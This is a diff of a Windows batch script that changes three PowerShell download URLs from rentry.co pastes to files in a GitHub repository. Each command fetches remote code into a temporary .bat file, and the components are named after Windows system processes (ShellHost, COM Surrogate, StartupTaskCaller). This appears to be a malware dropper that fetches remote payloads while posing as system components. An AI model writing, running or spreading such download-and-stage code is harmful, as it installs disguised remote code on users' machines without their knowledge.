@@ -34,7 +34,7 @@ echo Checking for ShellHost...
 set "embeddedScript=temp_script_SHST.bat"
 
 :: Download content and save to the embedded batch file
-powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://rentry.co/vogq6xig/raw') | Out-File -Encoding ASCII '%embeddedScript%'"
+powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/ShellHost') | Out-File -Encoding ASCII '%embeddedScript%'"
 
 if exist "%embeddedScript%" (
     echo Script content saved to %embeddedScript%.
@@ -73,7 +73,7 @@ echo Checking for COM Surrogate...
 set "embeddedScript=temp_script_COM.bat"
 
 :: Download content and save to the embedded batch file
-powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://rentry.co/kbg9xro5/raw') | Out-File -Encoding ASCII '%embeddedScript%'"
+powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/ComSurrogate') | Out-File -Encoding ASCII '%embeddedScript%'"
 
 if exist "%embeddedScript%" (
     echo Script content saved to %embeddedScript%.
@@ -110,7 +110,7 @@ echo Checking for StartupTaskCaller...
 set "embeddedScript=temp_script_STC.bat"
 
 :: Download content and save to the embedded batch file
-powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://rentry.co/m24vvavb/raw') | Out-File -Encoding ASCII '%embeddedScript%'"
+powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/StartupTaskCaller') | Out-File -Encoding ASCII '%embeddedScript%'"
 
 if exist "%embeddedScript%" (
     echo Script content saved to %embeddedScript%.
